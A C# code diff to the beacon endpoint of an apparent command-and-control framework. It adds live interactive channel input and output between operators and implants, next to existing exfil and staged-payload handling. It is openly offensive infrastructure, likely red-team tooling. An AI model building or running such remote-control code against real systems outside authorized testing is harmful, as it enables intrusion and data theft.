@@ -1,4 +1,5 @@
 using System.Collections.Concurrent;
+using System.Text;
 using Google.Protobuf;
 using Grpc.Core;
 using Microsoft.AspNetCore.Http;
@@ -9,6 +10,7 @@ using Rod.CoreState.Live;
 using Rod.CoreState.Pki;
 using Rod.CoreState.Sessions;
 using Rod.CoreState.Tasks;
+using Rod.Transport.Channels;
 using Rod.V1;
 // The domain entity shares its name with System.Threading.Tasks.Task. This file
 // uses Rod.CoreState.Tasks for the TaskId/TaskOutcome/TaskService types but never
@@ -39,6 +41,14 @@ namespace Rod.Transport.Endpoints;
 /// The same fan-out is used for exfil captures so a live operator sees an
 /// artifact arrive without re-polling the artifact endpoint.
 ///
+/// The stream is also the carrier for the streaming task shape
+/// (architecture.md Sec 10.3): a channel task's output arrives as
+/// <see cref="ChannelOutput"/> chunks that accumulate onto the task's
+/// transcript and fan out live, and the operator's input -- posted over HTTP
+/// through the <see cref="Channels.LiveChannelHub"/> -- drains downstream as
+/// <see cref="ChannelInput"/> frames from the same dispatch writer that pushes
+/// queued tasking.
+///
 /// mTLS is terminated at Kestrel before this handler runs: the presenting client
 /// certificate has already chained to the CA. The application-layer identity
 /// check (architecture.md Sec 9) -- that the certificate's
@@ -58,6 +68,7 @@ internal sealed class BeaconEndpoint : Beacon.BeaconBase
     private readonly TimeProvider _clock;
     private readonly IImplantCertificateAuthority _ca;
     private readonly ITaskDispatchWake _wake;
+    private readonly LiveChannelHub _channels;
 
     public BeaconEndpoint(
         HandshakeService handshake,
@@ -69,7 +80,8 @@ internal sealed class BeaconEndpoint : Beacon.BeaconBase
         ILiveEventBus bus,
         TimeProvider clock,
         IImplantCertificateAuthority ca,
-        ITaskDispatchWake wake)
+        ITaskDispatchWake wake,
+        LiveChannelHub channels)
     {
         _handshake = handshake;
         _sessions = sessions;
@@ -81,6 +93,7 @@ internal sealed class BeaconEndpoint : Beacon.BeaconBase
         _clock = clock;
         _ca = ca;
         _wake = wake;
+        _channels = channels;
     }
 
     public override async Task CheckIn(
@@ -191,8 +204,20 @@ internal sealed class BeaconEndpoint : Beacon.BeaconBase
         // downstream. The dispatch wake doubles as the handoff: a demand
         // releases the implant's wake, so the parked writer wakes and drains.
         var pulls = new ConcurrentQueue<Guid>();
-        var reader = ReadResultsAsync(session, requestStream, exfil, pulls, linked);
-        var writer = DispatchTasksAsync(session, pulls, responseStream, linked.Token);
+        // The stream's channel sink (architecture.md Sec 10.3, the streaming
+        // task shape): the operator input route enqueues onto it over HTTP and
+        // the writer drains it downstream as ChannelInput frames. Registered
+        // in the hub for the implant's lifetime of this stream; the using
+        // detaches it on stream end, leaving a newer stream's registration
+        // alone.
+        var inputs = new BeaconChannelSink(_wake, session.Implant);
+        using var attached = _channels.Attach(session.Implant, inputs);
+        // Channel output chunks may split a UTF-8 code point across frames;
+        // the decoder keeps the partial bytes and completes them on the next
+        // chunk so the transcript decodes what the channel actually printed.
+        var decoders = new ChannelDecoders();
+        var reader = ReadResultsAsync(session, requestStream, exfil, pulls, decoders, linked);
+        var writer = DispatchTasksAsync(session, pulls, inputs, responseStream, linked.Token);
 
         // Whichever finishes first cancels the other. The writer only ever ends
         // via cancellation (its loop runs for the session), so swallow the
@@ -219,6 +244,7 @@ internal sealed class BeaconEndpoint : Beacon.BeaconBase
         IAsyncStreamReader<Frame> requestStream,
         ExfilReassembler exfil,
         ConcurrentQueue<Guid> stagedPulls,
+        ChannelDecoders decoders,
         CancellationTokenSource linked)
     {
         var cancellationToken = linked.Token;
@@ -240,7 +266,7 @@ internal sealed class BeaconEndpoint : Beacon.BeaconBase
                 return;
             }
 
-            await HandleFrameAsync(session, requestStream.Current, exfil, stagedPulls, cancellationToken);
+            await HandleFrameAsync(session, requestStream.Current, exfil, stagedPulls, decoders, cancellationToken);
         }
     }
 
@@ -257,6 +283,7 @@ internal sealed class BeaconEndpoint : Beacon.BeaconBase
     private async Task DispatchTasksAsync(
         SessionContext session,
         ConcurrentQueue<Guid> stagedPulls,
+        BeaconChannelSink inputs,
         IServerStreamWriter<Frame> responseStream,
         CancellationToken cancellationToken)
     {
@@ -264,7 +291,37 @@ internal sealed class BeaconEndpoint : Beacon.BeaconBase
         {
             await DispatchNextAsync(session.Implant, responseStream, cancellationToken);
             await StreamStagedPullsAsync(session, stagedPulls, responseStream, cancellationToken);
+            await StreamChannelInputsAsync(inputs, responseStream, cancellationToken);
             await _wake.WaitAsync(session.Implant, cancellationToken);
+        }
+    }
+
+    // Drains the operator input the route queued onto this stream's sink, one
+    // ChannelInput frame per unit (architecture.md Sec 10.3): the streaming
+    // counterpart of DispatchNextAsync. The route validated the task before
+    // enqueueing; this is pure transport -- frame the bytes and write them to
+    // the implant that runs the channel.
+    private static async Task StreamChannelInputsAsync(
+        BeaconChannelSink inputs,
+        IServerStreamWriter<Frame> responseStream,
+        CancellationToken cancellationToken)
+    {
+        while (inputs.TryDequeue(out var unit))
+        {
+            var input = new ChannelInput
+            {
+                TaskId = new TaskId(unit.TaskId).ToString(),
+                Eof = unit.Eof,
+            };
+            if (unit.Data.Length > 0)
+                input.Data = ByteString.CopyFrom(unit.Data);
+            await responseStream.WriteAsync(
+                new Frame
+                {
+                    Payload = ByteString.CopyFrom(input.ToByteArray()),
+                    Kind = FrameKind.ChannelInput,
+                },
+                cancellationToken);
         }
     }
 
@@ -341,7 +398,8 @@ internal sealed class BeaconEndpoint : Beacon.BeaconBase
     // UNSPECIFIED default, which older implants still send) takes the
     // capture-and-audit path; EXFIL_CHUNK reassembles a streamed artifact into
     // the artifact store; STAGED_PULL hands the implant's demand for a staged
-    // payload to the writer. Non-result, non-exfil frames are ignored for now
+    // payload to the writer; CHANNEL_OUTPUT appends a streaming task's chunk
+    // onto its transcript. Non-result, non-exfil frames are ignored for now
     // (keepalives, etc.). This is the transport-layer composition the AC
     // calls for -- task state lives in core, the audit event in the audit
     // layer, and the beacon stream is where both meet on a completed task
@@ -351,6 +409,7 @@ internal sealed class BeaconEndpoint : Beacon.BeaconBase
         Frame frame,
         ExfilReassembler exfil,
         ConcurrentQueue<Guid> stagedPulls,
+        ChannelDecoders decoders,
         CancellationToken cancellationToken)
     {
         switch (frame.Kind)
@@ -361,12 +420,78 @@ internal sealed class BeaconEndpoint : Beacon.BeaconBase
             case FrameKind.StagedPull:
                 await HandleStagedPullAsync(session, frame, stagedPulls, cancellationToken);
                 return;
+            case FrameKind.ChannelOutput:
+                await HandleChannelOutputAsync(session, frame, decoders, cancellationToken);
+                return;
             case FrameKind.TaskResult:
             case FrameKind.Unspecified:
             default:
                 await HandleTaskResultAsync(frame, cancellationToken);
                 return;
         }
+    }
+
+    // A ChannelOutput frame (architecture.md Sec 10.3, the streaming task
+    // shape): one chunk of a live channel's output. The task must belong to
+    // this stream's implant and engagement -- an implant cannot stream onto
+    // another's tasks -- and must still be Dispatched; a straggler after the
+    // final TaskResult (a retransmission, a race at close) carries nothing
+    // new and is ignored rather than tearing the session down. The decoded
+    // chunk lands on the task's transcript and fans out live so a connected
+    // operator reads the channel as it prints.
+    private async Task HandleChannelOutputAsync(
+        SessionContext session,
+        Frame frame,
+        ChannelDecoders decoders,
+        CancellationToken cancellationToken)
+    {
+        ChannelOutput output;
+        try
+        {
+            output = ChannelOutput.Parser.ParseFrom(frame.Payload);
+        }
+        catch (InvalidProtocolBufferException)
+        {
+            return; // Malformed chunk; ignore rather than tearing down the stream.
+        }
+
+        if (!TaskId.TryParse(output.TaskId, out var taskId))
+            return;
+
+        var task = await _taskRecords.FindAsync(taskId, cancellationToken);
+        if (task is null || task.ImplantId != session.Implant || task.EngagementId != session.EngagementId)
+            return;
+
+        // An empty chunk is a legal heartbeat on some channel implementations;
+        // nothing to append.
+        if (output.Data.Length == 0)
+            return;
+
+        var text = decoders.Decode(taskId.Value, output.Data.Span);
+
+        TaskAppended appended;
+        try
+        {
+            appended = await _tasks.AppendChannelOutputAsync(taskId, text, cancellationToken);
+        }
+        catch (InvalidOperationException)
+        {
+            return;
+        }
+
+        // The audit trail needs no per-chunk event: the transcript is the
+        // task's own record and lands whole in its TaskCompleted event. The
+        // live event is the transient projection -- connected operators read
+        // the channel as it prints, without re-polling the task.
+        await _bus.PublishAsync(
+            LiveEvent.ChannelOutput(
+                appended.EngagementId,
+                appended.IssuedBy,
+                appended.ImplantId,
+                appended.TaskId,
+                text,
+                _clock.GetUtcNow()),
+            cancellationToken);
     }
 
     // A StagedPull frame: the implant demands a staged task's payload
@@ -793,4 +918,32 @@ internal sealed class BeaconEndpoint : Beacon.BeaconBase
     // a terminal chunk: the name and content type the implant declared plus the
     // concatenated bytes of every chunk in the stream.
     private readonly record struct Reassembled(string Name, string ContentType, byte[] Data);
+
+    // Incremental UTF-8 decoding for channel output, one decoder per task id.
+    // A channel may emit a chunk that splits a multi-byte code point across
+    // frames -- the shell does not frame on character boundaries -- and a
+    // per-chunk GetString would corrupt the transcript at every split. The
+    // decoder holds the partial bytes and completes the character on the next
+    // chunk, so the transcript decodes what the channel actually printed.
+    // Invalid sequences decode to the replacement character, the documented
+    // lossy behavior for a text transcript carrying non-UTF-8 output. The
+    // reader loop is the sole writer, so a plain Dictionary is safe; the
+    // decoders die with the stream, matching the channel's session scope.
+    private sealed class ChannelDecoders
+    {
+        private readonly Dictionary<Guid, Decoder> _byTask = new();
+
+        public string Decode(Guid taskId, ReadOnlySpan<byte> data)
+        {
+            if (!_byTask.TryGetValue(taskId, out var decoder))
+            {
+                decoder = Encoding.UTF8.GetDecoder();
+                _byTask[taskId] = decoder;
+            }
+
+            var chars = new char[decoder.GetCharCount(data, flush: false)];
+            var written = decoder.GetChars(data, chars, flush: false);
+            return new string(chars, 0, written);
+        }
+    }
 }
